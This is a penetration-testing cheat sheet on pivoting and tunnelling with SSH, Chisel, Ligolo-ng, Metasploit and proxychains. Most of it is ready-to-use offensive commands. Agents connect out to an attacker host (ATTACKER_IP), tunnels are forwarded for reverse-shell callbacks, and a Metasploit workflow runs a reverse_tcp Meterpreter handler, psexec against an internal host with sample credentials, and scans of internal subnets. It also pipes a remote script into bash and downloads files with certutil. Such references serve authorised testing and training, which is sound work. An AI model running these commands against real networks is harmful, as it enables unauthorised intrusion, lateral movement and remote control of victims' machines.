---
title: "Pivoting and Tunnelling"
description: "Expose a remote service on your local machine."
category: tunneling-pivoting
tags: ["tunneling-pivoting", "sql-injection", "pivoting", "tunneling"]
tools: ["Nmap", "Metasploit", "Meterpreter", "Evil-WinRM", "Chisel"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Misc/Pivoting and Tunnelling .md"
---
# Pivoting & Port Forwarding Cheat Sheet
## Practical Command Reference

---

## SSH Tunnelling

### Local Port Forwarding (-L)
Expose a remote service on your local machine.

```bash
# Syntax: ssh -L [local_addr:]local_port:dest_host:dest_port user@ssh_server

# Forward local port 8080 to internal web server 10.10.10.50:80 via jump host
ssh -L 8080:10.10.10.50:80 user@jump.example.com

# Bind only to localhost (more secure)
ssh -L 127.0.0.1:8080:10.10.10.50:80 user@jump.example.com

# Forward local 3306 to remote MySQL that only listens on localhost
ssh -L 3306:127.0.0.1:3306 user@dbserver.example.com

# Multiple forwards in one connection
ssh -L 8080:10.10.10.50:80 -L 3306:10.10.10.51:3306 user@jump.example.com
```

### Remote Port Forwarding (-R)
Expose a local service to the remote network.

```bash
# Syntax: ssh -R [remote_addr:]remote_port:dest_host:dest_port user@ssh_server

# Expose local port 80 on remote server's port 8080
ssh -R 8080:127.0.0.1:80 user@remote.example.com

# Expose local service to all interfaces on remote (requires GatewayPorts yes)
ssh -R 0.0.0.0:8080:127.0.0.1:80 user@remote.example.com

# Reverse shell callback - expose attacker's listener
ssh -R 4444:127.0.0.1:4444 user@compromised.example.com
```

### Dynamic Port Forwarding (-D) - SOCKS Proxy
Create a SOCKS proxy to access the remote network.

```bash
# Syntax: ssh -D [local_addr:]local_port user@ssh_server

# Create SOCKS5 proxy on port 1080
ssh -D 1080 user@jump.example.com

# Bind to localhost only
ssh -D 127.0.0.1:9050 user@jump.example.com

# Use with proxychains (edit /etc/proxychains4.conf first)
# Add: socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 10.10.10.0/24
proxychains4 curl http://10.10.10.50

# Use with curl directly
curl --proxy socks5h://127.0.0.1:1080 http://10.10.10.50

# Use with Firefox: Settings > Network > SOCKS5 > 127.0.0.1:1080
```

### Jump Hosts / ProxyJump (-J)
Chain through multiple hosts (OpenSSH 7.3+).

```bash
# Syntax: ssh -J user@jump1,user@jump2 user@destination

# Single jump
ssh -J user@bastion.example.com user@internal.server

# Multiple jumps
ssh -J user@jump1:22,user@jump2:22 user@final-target

# With port forwarding through jump
ssh -J user@bastion -L 8080:10.10.10.50:80 user@internal

# In ~/.ssh/config
Host internal
    HostName 10.10.10.50
    User admin
    ProxyJump user@bastion.example.com
```

### Useful SSH Options

```bash
# Background and don't execute remote command
ssh -fN -L 8080:10.10.10.50:80 user@jump

# Compression (helps on slow links)
ssh -C -D 1080 user@jump

# Keep connection alive
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 1080 user@jump

# Disable strict host key checking (lab use only!)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host

# Use specific key
ssh -i ~/.ssh/id_rsa_jump -D 1080 user@jump

# Verbose debugging
ssh -v -D 1080 user@jump    # -vv or -vvv for more
```

### ~/.ssh/config Example

```
Host bastion
    HostName bastion.example.com
    User jumpuser
    IdentityFile ~/.ssh/bastion_key
    DynamicForward 1080
    LocalForward 8443 internal-web:443
    ServerAliveInterval 60

Host internal-*
    ProxyJump bastion
    User admin

Host internal-db
    HostName 10.10.10.51
    LocalForward 3306 127.0.0.1:3306
```

---

## Chisel

### Installation

```bash
# Download latest release
curl https://i.jpillora.com/chisel! | bash

# Or from GitHub releases
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# Windows
certutil -urlcache -split -f https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz chisel.gz
```

### Server Mode (Attacker Machine)

```bash
# Basic server on port 8080
./chisel server -p 8080

# With reverse tunnel support (required for R: prefixed remotes)
./chisel server -p 8080 --reverse

# With SOCKS5 support
./chisel server -p 8080 --socks5

# With both
./chisel server -p 8080 --reverse --socks5

# With authentication
./chisel server -p 8080 --reverse --auth user:password

# With TLS (auto Let's Encrypt)
./chisel server -p 443 --reverse --tls-domain example.com

# With TLS (custom certs)
./chisel server -p 8443 --reverse --tls-key server.key --tls-cert server.crt

# Generate and use persistent key
./chisel server --keygen /tmp/chisel.key
./chisel server -p 8080 --reverse --keyfile /tmp/chisel.key
```

### Client Mode (Target/Pivot Machine)

```bash
# Connect and forward local port 8080 to server's localhost:80
./chisel client ATTACKER_IP:8080 8080:127.0.0.1:80

# Forward local 3000 to remote service at 10.10.10.50:3000
./chisel client ATTACKER_IP:8080 3000:10.10.10.50:3000

# SOCKS proxy (server needs --socks5)
./chisel client ATTACKER_IP:8080 socks
# Creates SOCKS5 on client localhost:1080

# Custom SOCKS port
./chisel client ATTACKER_IP:8080 5000:socks

# REVERSE tunnel - open port on SERVER that forwards to target network
./chisel client ATTACKER_IP:8080 R:8001:10.10.10.50:80
# Now attacker can access 10.10.10.50:80 via localhost:8001

# REVERSE SOCKS - SOCKS proxy on attacker, exits on target network
./chisel client ATTACKER_IP:8080 R:socks
# SOCKS5 on attacker localhost:1080, traffic exits via target

# Reverse SOCKS on custom port
./chisel client ATTACKER_IP:8080 R:1080:socks

# Multiple tunnels
./chisel client ATTACKER_IP:8080 R:8001:10.10.10.50:80 R:8002:10.10.10.51:22 R:socks

# With authentication
./chisel client --auth user:password ATTACKER_IP:8080 R:socks

# With fingerprint verification (get fingerprint from server output)
./chisel client --fingerprint XXXXX ATTACKER_IP:8080 R:socks

# Through a proxy
./chisel client --proxy http://proxy:3128 ATTACKER_IP:8080 R:socks
./chisel client --proxy socks://proxy:1080 ATTACKER_IP:8080 R:socks

# Verbose output
./chisel client -v ATTACKER_IP:8080 R:socks
```

### Common Chisel Patterns

```bash
# PATTERN 1: Reverse SOCKS (most common for pivoting)
# Attacker:
./chisel server -p 8080 --reverse
# Target:
./chisel client ATTACKER:8080 R:socks
# Use: proxychains nmap -sT -Pn 10.10.10.0/24

# PATTERN 2: Access internal web server
# Attacker:
./chisel server -p 8080 --reverse
# Target:
./chisel client ATTACKER:8080 R:8001:192.168.1.100:80
# Access: curl http://127.0.0.1:8001

# PATTERN 3: Forward SOCKS (client-side proxy)
# Attacker:
./chisel server -p 8080 --socks5
# Target:
./chisel client ATTACKER:8080 1080:socks
# Configure browser/tools on TARGET to use localhost:1080

# PATTERN 4: Expose target's SSH
# Attacker:
./chisel server -p 8080 --reverse
# Target:
./chisel client ATTACKER:8080 R:2222:127.0.0.1:22
# Attacker: ssh user@127.0.0.1 -p 2222
```

---

## Ligolo-ng

### Installation

```bash
# Download proxy (attacker) and agent (target)
# From: https://github.com/nicocha30/ligolo-ng/releases

# Attacker (Linux)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz

# Agent (Linux target)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.6.2_linux_amd64.tar.gz

# Agent (Windows target)
# Download: ligolo-ng_agent_0.6.2_windows_amd64.zip
```

### Proxy Setup (Attacker Machine)

```bash
# Create TUN interface (required, needs root/sudo)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# For multiple tunnels, create additional interfaces
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Start proxy with self-signed cert
./proxy -selfcert

# Start proxy with Let's Encrypt (requires port 443)
./proxy -autocert

# Custom port
./proxy -selfcert -laddr 0.0.0.0:443

# With specific interface binding
./proxy -selfcert -laddr 10.10.14.5:11601
```

### Agent Setup (Target Machine)

```bash
# Linux - connect to proxy
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows
agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Through SOCKS proxy
./agent -connect ATTACKER_IP:11601 -ignore-cert --socks 127.0.0.1:1080

# With retry
./agent -connect ATTACKER_IP:11601 -ignore-cert -retry
```

### Proxy Commands (Interactive Console)

```bash
# List connected agents
ligolo-ng » session

# Select an agent (by ID number)
ligolo-ng » session
? Specify a session: 1 - user@target - 192.168.1.50:54321

# Show agent network interfaces
[Agent: user@target] » ifconfig

# Start the tunnel on default interface
[Agent: user@target] » start

# Start tunnel on specific interface (for multiple tunnels)
[Agent: user@target] » start --tun ligolo2

# Stop tunnel
[Agent: user@target] » stop

# Add listener (port forward from agent network)
[Agent: user@target] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
# Opens 1234 on agent, forwards to attacker's 4444

# List listeners
[Agent: user@target] » listener_list

# Remove listener
[Agent: user@target] » listener_del 0
```

### Route Configuration (Attacker Machine)

```bash
# Add route to target network through ligolo interface
sudo ip route add 10.10.10.0/24 dev ligolo

# Multiple networks
sudo ip route add 192.168.1.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo

# For second tunnel (different agent), use ligolo2
sudo ip route add 10.20.30.0/24 dev ligolo2

# Verify routes
ip route | grep ligolo

# Remove route when done
sudo ip route del 10.10.10.0/24 dev ligolo
```

### Complete Ligolo-ng Workflow

```bash
# === ATTACKER SETUP ===
# 1. Create interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Start proxy
./proxy -selfcert -laddr 0.0.0.0:443

# === TARGET ===
# 3. Run agent (transfer binary first)
./agent -connect ATTACKER_IP:443 -ignore-cert

# === ATTACKER PROXY CONSOLE ===
# 4. Select session
ligolo-ng » session
# Select the agent

# 5. Check target interfaces (note the internal subnet)
[Agent] » ifconfig
# e.g., see 10.10.10.0/24 on eth1

# 6. Start tunnel
[Agent] » start

# === ATTACKER SHELL ===
# 7. Add route to internal network
sudo ip route add 10.10.10.0/24 dev ligolo

# 8. Now you can access internal network directly!
ping 10.10.10.1
nmap -sT -Pn 10.10.10.0/24
curl http://10.10.10.50
ssh user@10.10.10.51

# === REVERSE PORT FORWARD (for callbacks) ===
# On proxy console:
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Now internal hosts can connect to agent:4444, reaches attacker:4444
# Useful for reverse shells from double-pivoted networks
```

### Double Pivot with Ligolo-ng

```bash
# First pivot already established to 10.10.10.0/24
# Now pivot through 10.10.10.50 to reach 192.168.1.0/24

# === ATTACKER ===
# Create second interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Create listener on first agent to relay second agent connection
[Agent: first] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# === SECOND PIVOT HOST (10.10.10.50) ===
# Run agent connecting through first pivot
./agent -connect 10.10.10.FIRST_AGENT:11601 -ignore-cert

# === ATTACKER PROXY CONSOLE ===
# Select new session
ligolo-ng » session
# Select second agent

# Start on second interface
[Agent: second] » start --tun ligolo2

# === ATTACKER ===
# Add route for deep network
sudo ip route add 192.168.1.0/24 dev ligolo2

# Now reach 192.168.1.0/24 through double pivot!
nmap -sT -Pn 192.168.1.0/24
```

---

## Metasploit Framework Pivoting

### Autoroute (Add Routes Through Session)

```bash
# From Meterpreter session
meterpreter > run autoroute -s 10.10.10.0/24

# Or with netmask
meterpreter > run autoroute -s 10.10.10.0 -n 255.255.255.0

# Print routes
meterpreter > run autoroute -p

# Delete route
meterpreter > run autoroute -d -s 10.10.10.0

# Using post module (from msf console)
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > set SUBNET 10.10.10.0
msf6 post(autoroute) > set NETMASK /24
msf6 post(autoroute) > run

# Manual route add from msf console
msf6 > route add 10.10.10.0/24 1
msf6 > route add 192.168.1.0 255.255.255.0 1

# View routes
msf6 > route print

# Remove route
msf6 > route remove 10.10.10.0/24 1

# Flush all routes
msf6 > route flush
```

### SOCKS Proxy Module

```bash
# Background your meterpreter session first
meterpreter > background

# Use SOCKS proxy module
msf6 > use auxiliary/server/socks_proxy

# Configure
msf6 auxiliary(socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5

# Optional auth (SOCKS5 only)
msf6 auxiliary(socks_proxy) > set USERNAME proxyuser
msf6 auxiliary(socks_proxy) > set PASSWORD proxypass

# Run in background
msf6 auxiliary(socks_proxy) > run -j

# Verify it's running
msf6 > jobs

# Configure proxychains (/etc/proxychains4.conf)
# socks5 127.0.0.1 1080

# Use external tools through proxy
proxychains4 nmap -sT -Pn 10.10.10.0/24
proxychains4 curl http://10.10.10.50
proxychains4 ssh user@10.10.10.51
```

### Port Forwarding (portfwd)

```bash
# LOCAL FORWARD - access remote service locally
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.50
# Now access 10.10.10.50:80 via localhost:8080

# Forward to target's localhost service
meterpreter > portfwd add -l 3306 -p 3306 -r 127.0.0.1
# Access target's MySQL on your localhost:3306

# REMOTE/REVERSE FORWARD - for callbacks from deep network
meterpreter > portfwd add -R -l 4444 -L 0.0.0.0 -p 9999
# Listens on target:9999, forwards to attacker:4444

# List port forwards
meterpreter > portfwd list

# Delete specific forward
meterpreter > portfwd delete -l 8080 -p 80 -r 10.10.10.50

# Delete by index
meterpreter > portfwd delete -i 0

# Flush all
meterpreter > portfwd flush
```

### Complete Metasploit Pivoting Workflow

```bash
# === Initial Access ===
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST eth0
msf6 > set LPORT 4444
msf6 > run

# (get meterpreter session)

# === Enumerate Target Networks ===
meterpreter > ipconfig
meterpreter > arp
meterpreter > route

# Discover dual-homed: 192.168.1.50 and 10.10.10.50

# === Add Route ===
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p
meterpreter > background

# === Start SOCKS Proxy ===
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j

# === Scan Internal Network ===
# Option 1: Use Metasploit scanner modules (uses autoroute automatically)
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.0/24
msf6 > set PORTS 22,80,443,445,3389
msf6 > run

# Option 2: Use external tools via SOCKS
proxychains4 nmap -sT -Pn -p22,80,443,445 10.10.10.0/24

# === Exploit Internal Target ===
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.10.100
msf6 > set SMBUSER admin
msf6 > set SMBPASS password123
msf6 > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 > set RHOST 10.10.10.100
msf6 > run

# (traffic automatically routes through session 1)

# === Port Forward for Direct Access ===
# Re-enter first session
msf6 > sessions -i 1
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.100

# Now RDP to internal host
xfreerdp /v:127.0.0.1 /u:admin /p:password123
```

### Pivoting Through Multiple Networks

```bash
# Session 1: Access to 10.10.10.0/24
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

# Exploit host in 10.10.10.0/24 that has access to 192.168.1.0/24
# Get Session 2

# Session 2: Access to 192.168.1.0/24  
msf6 > sessions -i 2
meterpreter > run autoroute -s 192.168.1.0/24
meterpreter > background

# View all routes
msf6 > route print

# Traffic to 10.10.10.0/24 goes through Session 1
# Traffic to 192.168.1.0/24 goes through Session 2 (which itself routes through Session 1)
```

---

## Proxychains Configuration

### /etc/proxychains4.conf

```ini
# Dynamic chain - skip dead proxies
dynamic_chain

# Strict chain - all proxies must work
#strict_chain

# Random chain - random proxy order
#random_chain

# Quiet mode - less output
quiet_mode

# Proxy DNS through proxy (important!)
proxy_dns

# Timeouts
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# SOCKS5 proxy (Chisel, Metasploit)
socks5 127.0.0.1 1080

# SOCKS4 alternative
#socks4 127.0.0.1 1080

# Chain multiple proxies
#socks5 127.0.0.1 1080
#socks5 127.0.0.1 1081
```

### Proxychains Usage

```bash
# Basic usage
proxychains4 nmap -sT -Pn 10.10.10.0/24
proxychains4 curl http://10.10.10.50
proxychains4 ssh user@10.10.10.51
proxychains4 evil-winrm -i 10.10.10.50 -u admin -p password

# With specific config file
proxychains4 -f /tmp/myproxy.conf nmap -sT -Pn 10.10.10.50

# Quiet mode
proxychains4 -q curl http://10.10.10.50

# Note: Only TCP works through SOCKS
# Use -sT (TCP connect) not -sS (SYN scan) with nmap
# ICMP (ping) won't work through standard SOCKS
```

---

## Quick Reference Tables

### Port Forwarding Syntax Comparison

| Tool | Local Forward | Remote Forward | SOCKS Proxy |
|------|--------------|----------------|-------------|
| **SSH** | `ssh -L 8080:target:80 user@jump` | `ssh -R 8080:localhost:80 user@jump` | `ssh -D 1080 user@jump` |
| **Chisel** | `chisel client srv:8080 8080:target:80` | `chisel client srv:8080 R:8080:target:80` | `chisel client srv:8080 R:socks` |
| **Meterpreter** | `portfwd add -l 8080 -p 80 -r target` | `portfwd add -R -l 80 -p 8080` | `use auxiliary/server/socks_proxy` |
| **Ligolo-ng** | N/A (use routes) | `listener_add --addr 0.0.0.0:P1 --to 127.0.0.1:P2` | N/A (full routing) |

### Common Ports to Forward

| Service | Port | Example Forward |
|---------|------|-----------------|
| SSH | 22 | `-L 2222:target:22` |
| HTTP | 80 | `-L 8080:target:80` |
| HTTPS | 443 | `-L 8443:target:443` |
| SMB | 445 | `-L 4445:target:445` |
| RDP | 3389 | `-L 3389:target:3389` |
| WinRM | 5985/5986 | `-L 5985:target:5985` |
| MySQL | 3306 | `-L 3306:target:3306` |
| MSSQL | 1433 | `-L 1433:target:1433` |
| PostgreSQL | 5432 | `-L 5432:target:5432` |

### Tool Selection Quick Guide

| Scenario | Recommended Tool |
|----------|-----------------|
| Have SSH access, need single port | SSH -L/-R |
| Have SSH access, need multiple destinations | SSH -D (SOCKS) |
| Need to deploy binary, HTTP egress only | Chisel |
| Need full L3 routing (ICMP, raw nmap) | Ligolo-ng |
| Already have Meterpreter session | Metasploit autoroute |
| Double/triple pivot | Ligolo-ng or Chisel chains |
| Stealth (use existing services) | SSH |

---

## Troubleshooting

```bash
# SSH: Debug connection issues
ssh -vvv -D 1080 user@host

# SSH: Test if forwarding works
# Local: curl localhost:8080 after -L 8080:target:80
# Check server allows forwarding: grep -i tcpforwarding /etc/ssh/sshd_config

# Chisel: Verbose mode
./chisel client -v ATTACKER:8080 R:socks
./chisel server -v -p 8080 --reverse

# Ligolo-ng: Verify TUN interface
ip link show ligolo
ip route | grep ligolo

# Ligolo-ng: Check agent connectivity
# In proxy console: session (should list agents)

# Metasploit: Verify routes
msf6 > route print
msf6 > route get 10.10.10.50

# Proxychains: Test
proxychains4 curl -v http://10.10.10.50

# General: Check listening ports
ss -tlnp | grep 1080
netstat -tlnp | grep 1080
```

---

## Sources

| Tool | Documentation |
|------|---------------|
| OpenSSH | https://man.openbsd.org/ssh |
| Chisel | https://github.com/jpillora/chisel |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| Ligolo-ng Docs | https://docs.ligolo.ng/ |
| Metasploit Pivoting | https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html |
| Proxychains-ng | https://github.com/rofl0r/proxychains-ng |
